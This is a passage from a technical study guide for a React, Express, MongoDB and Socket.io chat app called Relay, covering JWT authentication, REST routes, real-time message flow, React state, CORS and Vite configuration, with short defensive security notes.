jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '7d' })
           ↓
Response: { token, user: { id, username, email } }
           ↓
localStorage.setItem('token', token)
setUser(res.data.user)
```

**Why "Invalid credentials" for both not-found and wrong password?**
If you say "user not found" for a non-existent email, an attacker can enumerate valid accounts. A generic message prevents user enumeration.

---

# 12. JWT Deep Dive

## What JWT is

JSON Web Token (JWT) is a compact, URL-safe token format for representing claims. It allows the server to verify a user's identity without storing session state.

## Structure

```
xxxxx.yyyyy.zzzzz
  │      │      │
Header  Payload  Signature
```

### Header (Base64URL encoded)
```json
{ "alg": "HS256", "typ": "JWT" }
```
`alg`: HMAC-SHA256 is used to sign the token.

### Payload (Base64URL encoded) — from Relay
```json
{
  "id": "64a3f9c0e4b0d1234567890a",
  "username": "alice",
  "email": "alice@example.com",
  "iat": 1720000000,
  "exp": 1720604800
}
```
- `id`: MongoDB ObjectId of the user
- `iat`: Issued At timestamp
- `exp`: Expiry timestamp (7 days from issue in Relay)

### Signature
```
HMACSHA256(
  base64url(header) + "." + base64url(payload),
  JWT_SECRET
)
```

The signature is what makes JWT secure. Only the server that knows `JWT_SECRET` can:
- Create a valid signature
- Verify that the token was not tampered with

**Important**: JWT is encoded, not encrypted. The payload is readable by anyone — do not store sensitive data in it.

## Relay JWT lifecycle

| Step | Code | Where |
|------|------|--------|
| Create | `jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '7d' })` | `routes/auth.js` on register and login |
| Send to client | `res.json({ token, user })` | Same |
| Store in client | `localStorage.setItem('token', token)` | `AuthContext.jsx` |
| Read for requests | `localStorage.getItem('token')` | `utils/api.js` interceptor |
| Add to requests | `config.headers['Authorization'] = 'Bearer ' + token` | `utils/api.js` interceptor |
| Read on server | `req.header('Authorization').substring(7)` | `middleware/auth.js` |
| Verify | `jwt.verify(token, process.env.JWT_SECRET)` | `middleware/auth.js` |
| Use on server | `req.user = decoded` (contains `{ id, username, email, iat, exp }`) | After `auth.js` runs |
| Reject invalid | `return res.status(401).json({ message: 'Token is invalid or expired' })` | `middleware/auth.js` |

## Authentication middleware line-by-line

**File**: `chat-app-backend/middleware/auth.js`

```js
// Line 1: Fail fast if JWT_SECRET is not configured
if (!process.env.JWT_SECRET) {
  process.exit(1);  // Server refuses to start — cannot operate securely without it
}

module.exports = function (req, res, next) {
  // Line 2: Read Authorization header
  const authHeader = req.header('Authorization');
  let token = null;

  // Line 3: Extract Bearer token
  if (authHeader && authHeader.startsWith('Bearer ')) {
    token = authHeader.substring(7, authHeader.length);
    // substring(7) skips 'Bearer ' (7 characters)
  }

  // Line 4: No token → reject
  if (!token) {
    return res.status(401).json({ message: 'No authorization token, access denied' });
  }

  try {
    // Line 5: Verify signature and expiry
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    // If token is forged, expired, or malformed → throws JsonWebTokenError
    // decoded = { id, username, email, iat, exp }

    req.user = decoded;  // Available to all downstream route handlers
    next();              // Pass to route handler
  } catch (err) {
    // Line 6: Expired or tampered token
    res.status(401).json({ message: 'Token is invalid or expired' });
  }
};
```

## Why JWT is stateless

The server does not need to store tokens or sessions. When a request arrives:
1. Verify the signature → confirms the server issued it and it hasn't been tampered with
2. Check `exp` → confirms it hasn't expired
3. Extract `id` from payload → know which user this is

No database lookup required for authentication.

---

# 13. Authorization

## Authentication vs Authorization

```
Authentication: Who are you?   → "I am Alice" (verified by JWT)
Authorization:  What can you do? → "Alice can join rooms she's a member of"
```

## Authorization in Relay

| Action | Who can | How enforced |
|--------|---------|-------------|
| Register / Login | Anyone | Public routes — no `auth` middleware |
| Create a room | Any authenticated user | `auth` middleware on POST `/api/rooms` |
| List all rooms | Any authenticated user | `auth` middleware on GET `/api/rooms` |
| Join a private room | Auth user + correct access key | `auth` + bcrypt.compare in POST `/:id/join` |
| Join a public room | Any authenticated user | `auth` middleware, no key check |
| Send a message | Members (socket trust) | Socket payload contains `userId` from frontend state |
| Leave a room | Auth user in the room | `auth` middleware, member filter |
| Fetch message history | Any authenticated user | `auth` middleware |
| Verify token | Any token holder | `auth` middleware on GET `/api/auth/verify` |

**Important limitation**: Socket.io events in Relay trust the `userId` sent in the payload from the frontend. The socket layer does not independently verify the JWT. This is a known limitation (discussed in Weaknesses section).

---

# 14. REST API Reference

## Auth Routes — `routes/auth.js`

### POST `/api/auth/register`

```
Purpose:     Create a new user account
Auth:        None
Body:        { username: string, email: string, password: string }
Response 200: { token: string, user: { id, username, email } }
Response 400: { message: "Please enter all fields" }
              { message: "Password must be at least 6 characters" }
              { message: "User with this email already exists" }
              { message: "Username is already taken" }
Response 500: "Server error"
DB ops:      User.findOne(email), User.findOne(username), new User().save()
```

### POST `/api/auth/login`

```
Purpose:     Authenticate with username/email + password, receive JWT
Auth:        None
Body:        { usernameOrEmail: string, password: string }
Response 200: { token: string, user: { id, username, email } }
Response 400: { message: "Please enter all fields" }
              { message: "Invalid credentials" }
Response 500: "Server error"
DB ops:      User.findOne($or[email, username]), bcrypt.compare
```

### GET `/api/auth/verify`

```
Purpose:     Validate a stored JWT and return current user data
Auth:        Required (Bearer token)
Body:        None
Response 200: { id, username, email }
Response 401: { message: "No authorization token, access denied" }
              { message: "Token is invalid or expired" }
Response 404: { message: "User not found" }
DB ops:      User.findById(req.user.id).select('-password')
```

## Room Routes — `routes/rooms.js`

### POST `/api/rooms`

```
Purpose:     Create a new chat room
Auth:        Required
Body:        { name: string, description?: string, isPrivate?: boolean, accessKey?: string }
Response 201: Room document
Response 400: { message: "Room name is required" }
              { message: "Access key is required for private rooms" }
              { message: "Room with this name already exists" }
Side effect: req.io.emit('roomCreated', newRoom) — broadcasts to all connected sockets
DB ops:      Room.findOne(name), bcrypt.hash(accessKey), new Room().save()
```

### GET `/api/rooms`

```
Purpose:     Fetch all rooms (public and private) sorted newest first
Auth:        Required
Response 200: Room[] (with createdBy populated as { username, email })
DB ops:      Room.find().populate('createdBy', 'username email').sort({ createdAt: -1 })
```

### GET `/api/rooms/:id`

```
Purpose:     Get full details of one room including member list
Auth:        Required
Params:      id — Room ObjectId
Response 200: Room (with createdBy and members populated)
Response 404: { message: "Room not found" }
DB ops:      Room.findById(id).populate('createdBy').populate('members', 'username')
```

### POST `/api/rooms/:id/join`

```
Purpose:     Join a room (verifies access key for private rooms)
Auth:        Required
Params:      id — Room ObjectId
Body:        { accessKey?: string }
Response 200: Updated Room document
Response 401: { message: "Access key is required for this private room" }
              { message: "Invalid access key for this private room" }
Response 404: { message: "Room not found" }
DB ops:      Room.findById, bcrypt.compare(accessKey, room.accessKey), room.members.push, room.save()
```

### POST `/api/rooms/:id/leave`

```
Purpose:     Leave a room — removes user from members, saves system message
Auth:        Required
Params:      id — Room ObjectId
Response 200: { message: "Successfully left the room", roomId }
Side effects:
  - req.io.to(roomId).emit('userLeftChat', {...})
  - new Message({ senderUsername: 'System', content: '... left the chat' }).save()
  - req.io.to(roomId).emit('message', systemMessage)
DB ops:      Room.findById, room.members.filter, room.save, new Message().save()
```

### GET `/api/rooms/:id/messages`

```
Purpose:     Fetch paginated message history (cursor-based by timestamp)
Auth:        Required
Params:      id — Room ObjectId
Query:       limit (default 50), before (ISO timestamp for cursor pagination)
Response 200: Message[] in chronological order (oldest → newest)
DB ops:      Message.find({ room, timestamp: { $lt: before } }).sort({ timestamp: -1 }).limit(n)
             Results are .reverse()d before sending
```

---

# 15. HTTP Deep Dive

## HTTP concepts connected to Relay

| Concept | Relay usage |
|---------|-------------|
| `POST` | Register, login, create room, join room, leave room |
| `GET` | Verify token, list rooms, get room, get messages |
| `200 OK` | Successful login, verification, room list |
| `201 Created` | Successful room creation |
| `400 Bad Request` | Validation errors, duplicate user, invalid credentials |
| `401 Unauthorized` | Missing/invalid/expired JWT |
| `404 Not Found` | Room not found by ID |
| `500 Internal Server Error` | Unhandled server exceptions |

## Request structure

```
POST /api/auth/login HTTP/1.1
Host: localhost:5080
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

{ "usernameOrEmail": "alice", "password": "secret123" }
```

## Response structure

```
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{ "token": "eyJ...", "user": { "id": "...", "username": "alice", "email": "..." } }
```

## Query parameters (used in Relay)

```
GET /api/rooms/abc123/messages?limit=50&before=2024-01-15T10:30:00.000Z
```

`req.query.limit` → `'50'` (string — must be parsed with `parseInt`)
`req.query.before` → ISO timestamp string used in MongoDB query

## Path parameters

```
GET /api/rooms/:id
```

`req.params.id` → the room's ObjectId string from the URL

---

# 16. Socket.io Deep Dive

## The WebSocket problem Socket.io solves

Plain HTTP is request-response: the client must ask before the server can answer. For real-time messaging, this means **the server cannot push a message to the client unprompted**.

**WebSocket** solves this by upgrading an HTTP connection to a persistent bidirectional TCP connection:
```
Client → HTTP Upgrade Request → Server
Client ← 101 Switching Protocols ← Server
Client ↔ WebSocket frames ↔ Server (persistent, bidirectional)
```

**Socket.io** builds on WebSocket and adds:
- Automatic reconnection with exponential backoff
- Rooms (logical groupings of sockets)
- Namespaces
- Fallback to HTTP polling if WebSocket is unavailable
- Event-based API (emit/on) instead of raw message strings
- Acknowledgements

## Socket.io in Relay

### Server initialization

```js
const io = socketIo(server, {
  cors: { origin: corsOriginHandler, methods: ['GET', 'POST'], credentials: true }
});
```

Socket.io attaches to the raw `http.Server`, not Express. It handles the WebSocket upgrade at the HTTP layer before Express sees the request.

### Client connection

**File**: `src/context/SocketContext.jsx`

```js
const socketInstance = io(socketUrl, {
  transports: ['websocket', 'polling'],  // Try WebSocket first, fall back to polling
  autoConnect: true,
  reconnectionAttempts: 5,
  reconnectionDelay: 1000
});
```

### Events in Relay

| Event | Direction | Purpose |
|-------|-----------|---------|
| `joinRoom` | Client → Server | Enter a room, load history, register presence |
| `leaveRoom` | Client → Server | Exit a room, update presence |
| `chatMessage` | Client → Server | Send a new message |
| `typing` | Client → Server | Start/stop typing indicator |
| `messageReaction` | Client → Server | Add/change/remove reaction |
| `disconnect` | System | Socket connection closed |
| `loadHistory` | Server → Client | Initial 50 messages on room join |
| `message` | Server → Room | New message broadcast |
| `onlineUsers` | Server → Room | Updated presence list |
| `userJoined` | Server → Room | Someone joined notification |
| `userLeftChat` | Server → Room | Someone left notification |
| `typing` | Server → Room | Typing indicator relay |
| `reactionUpdate` | Server → Room | Reaction change broadcast |
| `roomCreated` | Server → All | New room broadcast (via REST req.io) |

---

# 17. Exact Message Flow

## Complete sequence: User A sends a message to User B

```
USER A's browser
│
│ Types text in MessageInput.jsx textarea
│
│ Presses Enter (or clicks Send button)
│   → handleKeyDown → send() called
│   → onSendMessage(text) prop called
│
│ ChatRoom.jsx → handleSendMessage(content)
│   socket.emit('chatMessage', {
│     roomId: activeRoom._id,
│     userId: user.id,
│     username: user.username,
│     message: content
│   })
│
▼ WebSocket frame sent to server
│
SERVER — socketHandler.js
│
│ socket.on('chatMessage', async ({ roomId, userId, username, message }) => {
│
│   1. Validation:
│      if (!roomId || !userId || !username || !message || !message.trim()) return;
│
│   2. Create Mongoose document:
│      const newMessage = new Message({
│        room: roomId,         // ObjectId string → stored as ObjectId
│        sender: userId,
│        senderUsername: username,
│        content: message.trim(),
│        messageType: 'text'
│      });
│
│   3. Persist to MongoDB:
│      await newMessage.save();
│      → MongoDB stores the document
│      → newMessage._id, timestamp assigned by MongoDB/Mongoose
│
│   4. Broadcast to room:
│      io.to(roomId).emit('message', newMessage);
│      → Finds all sockets that have joined Socket.io room 'roomId'
│      → Sends 'message' event to ALL of them (including sender)
│
▼ WebSocket frames sent to all room members
│
USER A's browser (sender)
│  socket.on('message') → setMessages(p => [...p, msg])
│  MessageList re-renders → new bubble appears
│
USER B's browser (receiver)
│  socket.on('message') → setMessages(p => [...p, msg])
│  MessageList re-renders → new bubble appears
```

## What happens if MongoDB fails?

`await newMessage.save()` throws an error. The `catch` block logs it:
```js
console.error('[Socket] Chat message error:', err);
```
The socket emission DOES NOT happen. User A sees no message. User B receives nothing.
**Production improvement**: Emit an error event back to the sender, show a "failed to send" indicator.

## What happens if the socket disconnects between save and emit?

The message is saved in MongoDB. When the user reconnects and rejoins the room, they load history and see the message. From User B's perspective, they do not receive it in real-time — they see it on next join.

## What happens if two users send simultaneously?

Node.js processes socket events sequentially per event loop tick. Two simultaneous socket events are queued. The `await newMessage.save()` calls are independent operations on different documents — no conflict. MongoDB handles concurrent inserts without issue. Messages may be stored in slightly different order than they were "sent" but the `timestamp` field is set server-side at insert time, so ordering is consistent.

## What happens if socket.io emits but some clients miss it?

No guaranteed delivery in the current implementation. If User B's socket is temporarily disconnected during the emit, they miss the message. They recover it when they rejoin the room (message history loads the last 50 from MongoDB).

---

# 18. Socket.io Rooms

## What a Socket.io room is

A Socket.io room is a server-side logical channel. Any socket can join or leave a room. When you emit to a room, all sockets in that room receive the event.

**Important distinction**: Socket.io rooms are completely separate from Relay's MongoDB Room documents. They share the same room ID string (MongoDB ObjectId), but:
- MongoDB Room = persistent data (name, members, messages)
- Socket.io room = in-memory grouping of active socket connections

## How Relay uses rooms

```js
// Server: When user joins
socket.join(roomId);  // This socket now receives events emitted to roomId

// Server: When user leaves or disconnects
socket.leave(roomId);
```

## Emit comparison (critical interview topic)

| Method | Who receives it |
|--------|----------------|
| `socket.emit('event', data)` | Only this specific socket (the sender) |
| `socket.to(roomId).emit('event', data)` | All sockets in the room EXCEPT the sender |
| `socket.broadcast.emit('event', data)` | ALL connected sockets EXCEPT the sender |
| `io.to(roomId).emit('event', data)` | ALL sockets in the room INCLUDING the sender |
| `io.emit('event', data)` | ALL connected sockets (everyone on the server) |

**Relay usage**:
- `io.to(roomId).emit('message', msg)` — broadcast message to ALL room members including sender
- `socket.to(roomId).emit('userJoined', ...)` — notify others that someone joined, NOT the joiner themselves
- `io.to(roomId).emit('onlineUsers', ...)` — send updated presence to everyone in the room
- `socket.to(roomId).emit('typing', ...)` — send typing event to everyone EXCEPT the typer
- `req.io.emit('roomCreated', newRoom)` — sent from REST route, broadcasts to ALL connected sockets

---

# 19. Real-Time Architecture — REST vs Socket.io

## Why Relay uses both REST and Socket.io

**REST (HTTP) is used for**:
- Authentication (register, login, verify) — one-time request-response
- Room creation — persisting to database, then broadcasting via `req.io`
- Joining/leaving rooms — requires authentication middleware, database writes
- Fetching message history — client-initiated, returns data to requester only
- Initial room list — client asks once on page load

**Socket.io is used for**:
- Real-time message delivery — server must push to all recipients without polling
- Typing indicators — must arrive within milliseconds, no persistence needed
- Presence (online users) — must update live as users join/leave
- Reaction updates — must propagate to all room viewers immediately
- Room creation notification — REST creates the room, then `req.io.emit` notifies all active sockets

## Why not use only WebSocket?

WebSocket lacks:
- HTTP semantics (status codes, headers)
- Middleware patterns
- Easy authentication via Bearer token headers
- REST conventions that tools like Postman understand

Using REST for CRUD operations keeps the API clean and testable.

## Why not use only REST (polling)?

Polling (client repeatedly asking "any new messages?") causes:
- Unnecessary load on server and database
- Latency (message arrives during poll gap)
- Not truly real-time

---

# 20. React Deep Dive

## React concepts used in Relay

### Components

Every UI element is a React functional component:
- `App` — root component
- `Login`, `Register` — auth pages
- `ChatRoom` — main workspace
- `MessageList`, `Message`, `MessageInput`, `TypingIndicator` — chat components
- `RoomList`, `CreateRoom`, `OnlineUsers` — sidebar components
- `Avatar`, `ConfirmModal` — utility components

### Props

Data passed from parent to child. Example:
```jsx
<MessageList
  messages={messages}           // array of message objects
  currentUserId={user.id}       // string
  onLoadOlder={handleLoadOlder} // callback function
  hasMoreOlder={hasMoreOlder}   // boolean
  onReact={handleReact}         // callback function
/>
```

### State (useState)

Local state that triggers re-renders:
```jsx
const [messages, setMessages] = useState([]);  // ChatRoom
const [text, setText]         = useState('');  // MessageInput
const [isDark, setIsDark]     = useState(...)  // ChatRoom
const [isSubmitting, setIsSubmitting] = useState(false); // Login
```

### useEffect

Side effects that run after render:

```jsx
// Fetch rooms on mount
useEffect(() => {
  fetchRooms();
}, []);  // empty deps → runs once on mount

// Socket events when activeRoom changes
useEffect(() => {
  if (!activeRoom?._id || !socket) return;
  socket.emit('joinRoom', ...);
  socket.on('message', handler);
  return () => {
    socket.off('message', handler);  // cleanup on unmount / room change
  };
}, [activeRoom?._id, socket?.id]);  // re-runs when room or socket changes

// Auto-scroll to bottom
useEffect(() => {
  bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
}, [messages]);  // re-runs every time messages array changes
```

### useContext

Reads from React Context providers:
```jsx
const { user, logout } = useContext(AuthContext);
const { socket, isConnected } = useContext(SocketContext);
```

### useRef

Persists a value without causing re-renders:
```jsx
const bottomRef = useRef(null);    // DOM reference for auto-scroll
const timeoutRef = useRef(null);   // typing timeout ID (doesn't need to trigger render)
```

### Controlled inputs

The input's value is always driven by state:
```jsx
<input value={text} onChange={e => setText(e.target.value)} />
```

React is the single source of truth for the input value.

### React.StrictMode

Renders components twice in development to expose impure renders and incorrect cleanup. Does not affect production behavior.

---

# 21. Frontend Component-by-Component

## `App.jsx`

**Purpose**: Root — theme bootstrapping, context providers, routing
**Hooks**: `useEffect` (sync theme to DOM)
**Children**: `AuthProvider` → `SocketProvider` → `BrowserRouter` → `Routes`
**Key logic**: `getInitialTheme()` runs synchronously before first render to prevent flash of wrong theme

## `AuthContext.jsx`

**Purpose**: Global authentication state machine
**State**: `user`, `loading`, `error`
**Hooks**: `useState`, `useEffect`
**On mount**: Checks localStorage for token → calls `/api/auth/verify` → sets `user`
**Exports**: `user`, `loading`, `error`, `login()`, `register()`, `logout()`, `isAuthenticated`
**Who uses it**: `ChatRoom`, `Login`, `Register`, `ProtectedRoute`, `PublicRoute`

## `SocketContext.jsx`

**Purpose**: Manages the Socket.io client connection lifecycle
**State**: `socket`, `isConnected`
**Hooks**: `useState`, `useEffect`, `useContext(AuthContext)`
**Key behavior**: When `user` is null → disconnect. When `user` is set → connect.
**Connects to**: `VITE_APP_SOCKET_URL || window.location.origin`
**Exports**: `socket`, `isConnected`

## `Login.jsx`

**Purpose**: Authentication form — two-panel layout
**State**: `formData`, `showPassword`, `formError`, `isSubmitting`
**Hooks**: `useState`, `useContext(AuthContext)`, `useNavigate`
**On submit**: Validates fields → calls `login()` from AuthContext → navigates to `/chat` on success

## `Register.jsx`

**Purpose**: Registration form — two-panel layout
**State**: `formData`, `showPassword`, `showConfirm`, `formError`, `isSubmitting`
**Key validation**: Compares `password === confirmPassword` before API call

## `ChatRoom.jsx`

**Purpose**: Main workspace — orchestrates all real-time functionality
**State**: `rooms`, `activeRoom`, `messages`, `onlineUsers`, `typingUsers`, `isCreateOpen`, `hasMoreOlder`, `sidebarOpen`, `showLeaveModal`, `joinAccessKey`, `joinError`, `isJoining`, `isDark`
**Hooks**: `useState` (x13), `useEffect` (x4), `useContext` (AuthContext + SocketContext)
**Effects**:
1. Reset join form on room change
2. Fetch rooms on mount + listen for `roomCreated` socket event
3. Join Socket.io room on `activeRoom` change, register all socket event listeners
**Key logic**: `isMember = activeRoom?.members?.map(String).includes(String(user.id))` — determines whether to show chat or join prompt

## `MessageList.jsx`

**Purpose**: Render all messages in the current room
**Props**: `messages[]`, `currentUserId`, `onLoadOlder`, `hasMoreOlder`, `onReact`
**Effect**: Auto-scroll to bottom on new messages using `bottomRef`
**Key render logic**: Distinguishes system messages (senderUsername === 'System') from regular messages

## `Message.jsx`

**Purpose**: Single message bubble with avatar, reactions, and reaction picker
**Props**: `msg`, `isOwnMessage`, `onReact`
**State**: `showPicker` — reaction emoji picker visibility
**Key logic**:
- `usernameHue()` — deterministic hue from username string (so same user always same color)
- Groups reactions by emoji before rendering: `{ '👍': 2, '❤️': 1 }`
- Reaction picker appears on hover (mouseEnter/mouseLeave on the row)

## `MessageInput.jsx`

**Purpose**: Text input + send button + typing event emission
**State**: `text`, `isTyping`
**Refs**: `timeoutRef` — clears typing indicator 3 seconds after last keystroke
**Key behavior**: Enter sends, Shift+Enter would allow newline (currently Enter sends immediately)

## `CreateRoom.jsx`

**Purpose**: Modal form for creating a new room
**Props**: `isOpen`, `onClose`, `onRoomCreated`
**State**: `roomName`, `description`, `isPrivate`, `accessKey`, `error`, `isSubmitting`
**Key behavior**: When `isPrivate` unchecked, `accessKey` is cleared. On success, calls `onRoomCreated(res.data)` to update parent state.

## `RoomList.jsx`

**Purpose**: Searchable sidebar list of available rooms
**Props**: `rooms[]`, `activeRoom`, `onRoomSelect`
**State**: `search` (local filter string)
**Key logic**: `rooms.filter(r => r.name.toLowerCase().includes(search.toLowerCase()))`

## `OnlineUsers.jsx`

**Purpose**: Right panel showing members currently online in the active room
**Props**: `users[]` (from `onlineUsers` state in ChatRoom — populated by socket `onlineUsers` event)
**Note**: Hidden on viewports below 1024px via CSS

## `Avatar.jsx`

**Purpose**: Username-derived colored circle avatar
**Key logic**: Hash username to a stable hue → `hsl(hue, 55%, 50%)` ensures consistent color per user

## `ConfirmModal.jsx`

**Purpose**: Reusable confirmation dialog
**Props**: `isOpen`, `title`, `message`, `confirmText`, `cancelText`, `onConfirm`, `onCancel`, `danger`
**Used for**: Leave room confirmation in `ChatRoom.jsx`

---

# 22. React State Management

## State map

| State | Lives in | Why there | Changes when |
|-------|---------|-----------|-------------|
| `user` | AuthContext | App-wide — needed by all components | Login/logout/token verification |
| `loading` | AuthContext | Prevents flash of wrong route on startup | Token verification completes |
| `socket`, `isConnected` | SocketContext | App-wide — used by ChatRoom | User logs in/out |
| `rooms[]` | ChatRoom | Room list for sidebar | On mount fetch, `roomCreated` socket event |
| `activeRoom` | ChatRoom | Selected room — drives all chat content | User clicks a room |
| `messages[]` | ChatRoom | Chat history for current room | `loadHistory`, `message` socket events |
| `onlineUsers[]` | ChatRoom | Presence in current room | `onlineUsers` socket event |
| `typingUsers[]` | ChatRoom | Typing indicators | `typing` socket event |
| `isDark` | ChatRoom | Theme toggle | User clicks theme button |
| `text` | MessageInput | Current message being typed | Every keystroke |
| `showPicker` | Message | Reaction picker visibility | Mouse hover |
| `search` | RoomList | Room filter | User types in search |

## What causes re-renders

- `setMessages([...prev, newMsg])` → MessageList and all Message components re-render
- `setActiveRoom(room)` → entire chat area re-renders (history, header, member status)
- `setOnlineUsers(list)` → OnlineUsers re-renders
- `setIsDark(!isDark)` → ChatRoom re-renders (theme toggle button changes)

## Context vs local state decision

- **AuthContext**: Auth state is needed everywhere (route guards, API calls, socket connection, chat header) — Context is appropriate
- **SocketContext**: The socket instance must be shared across components in ChatRoom tree — Context is appropriate
- **messages, rooms**: Only used in ChatRoom and its children — local state is appropriate; no need for Context

---

# 23. API Communication

## Axios instance

**File**: `src/utils/api.js`

```js
const api = axios.create({
  baseURL: import.meta.env.VITE_API_URL || '',
  headers: { 'Content-Type': 'application/json' }
});
```

`baseURL` is empty in development because Vite proxies `/api` to the backend. In production, you'd set `VITE_API_URL=https://api.yourapp.com`.

## Request interceptor

```js
api.interceptors.request.use((config) => {
  const token = localStorage.getItem('token');
  if (token) {
    config.headers['Authorization'] = `Bearer ${token}`;
  }
  return config;
});
```

Every API call automatically includes the JWT. This means:
- You never manually add the header to individual calls
- If the user is not logged in (no token), the header is omitted
- After login stores the token, all subsequent calls include it automatically

## Error handling pattern

```jsx
try {
  const res = await api.post('/api/auth/login', { ... });
  // success path
} catch (err) {
  const errMsg = err.response?.data?.message || 'Login failed';
  setError(errMsg);
}
```

Axios puts the server response on `err.response`. The optional chaining handles cases where the request never reached the server (network error → `err.response` is undefined).

---

# 24. Frontend Authentication Flow

```
User opens http://localhost:3000
           ↓
index.jsx → renders App
           ↓
App.jsx reads localStorage('relay-theme') → sets data-theme attribute
           ↓
App.jsx renders AuthProvider
  → AuthContext initializes: user=null, loading=true
  → useEffect fires: reads localStorage('token')
  → If token exists: api.get('/api/auth/verify')
     → Backend: reads Authorization header → jwt.verify → User.findById → returns user data
     → setUser(res.data), setLoading(false)
  → If no token: setLoading(false) immediately
           ↓
App.jsx renders routes
  → Route /chat: ProtectedRoute checks isAuthenticated
  → If loading=true: shows spinner (prevents flash)
  → If isAuthenticated: renders ChatRoom
  → If not authenticated: Navigate to /login
           ↓
User on /login fills form → submits
  → AuthContext.login() → api.post('/api/auth/login')
  → Success: localStorage.setItem('token', token), setUser(user)
  → React Router: navigate('/chat')
           ↓
ChatRoom renders
  → SocketContext connects socket (user is now set)
  → ChatRoom fetches rooms: api.get('/api/rooms')
  → User selects a room → socket.emit('joinRoom', ...)
  → History arrives → messages state updated
  → User is in chat
           ↓
Subsequent API calls:
  → Axios interceptor reads localStorage('token')
  → Adds Authorization: Bearer <token>
  → Backend auth middleware verifies on every protected route
           ↓
User clicks logout:
  → AuthContext.logout(): localStorage.removeItem('token'), setUser(null)
  → SocketContext sees user=null → disconnects socket
  → ProtectedRoute sees isAuthenticated=false → Navigate to /login
```

---

# 25. CORS

## Same-origin policy

The browser's Same-Origin Policy blocks JavaScript from reading responses from a different origin. Two URLs share an origin only if all three match:
- Protocol (http vs https)
- Domain (localhost vs example.com)
- Port (3000 vs 5080)

**Relay's problem**: Frontend on `http://localhost:3000`, backend on `http://localhost:5080` — different ports → cross-origin.

## How CORS works

CORS (Cross-Origin Resource Sharing) allows the server to grant cross-origin access. The browser checks the server's response headers:
- `Access-Control-Allow-Origin: http://localhost:3000` → browser allows the response
- No header or wrong origin → browser blocks the response (request was still sent to server)

## Preflight requests

For requests that modify data (POST, PUT, DELETE) or have custom headers (like `Authorization`), the browser sends an `OPTIONS` preflight request first:

```
OPTIONS /api/auth/login
Origin: http://localhost:3000
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization, Content-Type
```

The server must respond with appropriate `Access-Control-Allow-*` headers. Express `cors()` middleware handles this automatically.

## Relay CORS configuration

**File**: `server.js`

```js
const corsOriginHandler = (origin, callback) => {
  if (!origin) return callback(null, true);              // Server-to-server, curl, Postman
  if (allowedOrigins.includes(origin)) return callback(null, true);  // Whitelisted origin
  callback(new Error(`Origin '${origin}' is not allowed by CORS`));  // Reject others
};
```

**Allowed origins** (from `CLIENT_URL` env var):
```
http://localhost:3000
```

**`credentials: true`**: Required because the Axios interceptor sends the `Authorization` header. Without `credentials: true`, the browser blocks headers on cross-origin requests.

**Our security fix**: The original code had `|| !process.env.CLIENT_URL` which allowed ALL origins when `CLIENT_URL` was not set. This was a CORS bypass bug. The fixed code defaults to localhost only in development mode.

## Vite proxy in development

```js
proxy: {
  '/api': { target: backendUrl, changeOrigin: true },
  '/socket.io': { target: backendUrl, ws: true }
}
```

The proxy makes browser requests go to `localhost:3000/api` → Vite forwards them to `localhost:5080/api`. From the browser's perspective, the origin is the same (3000). This eliminates CORS for `/api` calls entirely in development.

---

# 26. Vite

## What Vite is

Vite is a frontend build tool and dev server. Key advantages over older tools like Webpack:
- **No bundling in development**: Serves files as native ES modules. The browser loads only what it needs.
- **HMR (Hot Module Replacement)**: When you edit a component, only that module is updated in the browser — the page doesn't reload, and state is preserved.
- **Fast production builds**: Uses Rollup under the hood for optimized bundles.

## Relay's `vite.config.js`

```js
import { defineConfig, loadEnv } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig(({ mode }) => {
  const env = loadEnv(mode, process.cwd(), '');
  const backendUrl = env.VITE_API_URL || 'http://localhost:5080';

  return {
    plugins: [react()],
    server: {
      port: 3000,
      proxy: {
        '/api': { target: backendUrl, changeOrigin: true, secure: false },
        '/socket.io': { target: backendUrl, ws: true, changeOrigin: true, secure: false }
      }
    }
  };
});
```

- `loadEnv(mode, cwd, '')` — loads env vars at config time (needed because config runs in Node, not the browser)
- `plugins: [react()]` — enables JSX transform and React Fast Refresh (HMR)
- `port: 3000` — dev server port
- `proxy` — forwards `/api/*` and `/socket.io/*` to the backend

## VITE_ prefix

Environment variables must be prefixed with `VITE_` to be exposed to the browser bundle:
```
VITE_API_URL=http://localhost:5080   → available as import.meta.env.VITE_API_URL
SECRET_KEY=...                        → NOT exposed to browser (security by convention)
```

---

# 27. Package.json Dependencies

## Backend dependencies

### `express` ^4.19.2
Web framework. Without it: you'd write raw `http.createServer` with manual URL parsing and routing.

### `socket.io` ^4.7.5
Real-time bidirectional event-based communication. Without it: you'd need raw WebSocket with no rooms, no reconnection, no event names.

### `mongoose` ^8.4.1
MongoDB ODM. Without it: you'd use the raw `mongodb` driver with manual BSON, no schema validation, no `.populate()`.

### `jsonwebtoken` ^9.0.2
Creates and verifies JWTs. Without it: you'd need sessions (server-side state storage) or a third-party auth service.

### `bcryptjs` ^2.4.3
Password hashing. Without it: passwords stored as plaintext — catastrophic security failure. Pure JavaScript implementation (no native bindings — more portable than `bcrypt`).

### `cors` ^2.8.5
CORS middleware. Without it: you'd manually set `Access-Control-*` headers on every response.

### `dotenv` ^16.4.5
Loads `.env` file into `process.env`. Without it: you'd hardcode or use OS-level env vars manually.

### `nodemon` ^3.1.3 (devDependency)
Auto-restarts server on file save. Without it: you'd `Ctrl+C` and re-run `node server.js` after every backend change.

## Frontend dependencies

### `react` ^18.3.1 + `react-dom` ^18.3.1
The UI framework. React 18 added concurrent features and automatic batching.

### `react-router-dom` ^6.23.1
Client-side routing. Provides `BrowserRouter`, `Routes`, `Route`, `Navigate`, `Link`, `useNavigate`. Without it: you'd manage URL changes and page transitions manually.

### `axios` ^1.7.2
HTTP client. Preferred over `fetch` because: interceptors (automatic auth header), automatic JSON parsing, better error objects (`err.response`), cancellation support.

### `socket.io-client` ^4.7.5
Must match major version of server `socket.io`. Handles WebSocket connection, reconnection, events. The `^4.7.5` in both ensures compatibility.

### `vite` ^5.2.11 + `@vitejs/plugin-react` ^4.3.0 (devDependencies)
Build tooling. `@vitejs/plugin-react` enables Fast Refresh and JSX transform during development.

---

# 28. Error Handling

## Validation errors

**Where**: Route handlers in `routes/auth.js` and `routes/rooms.js`
**How**: Manual checks before database operations
```js
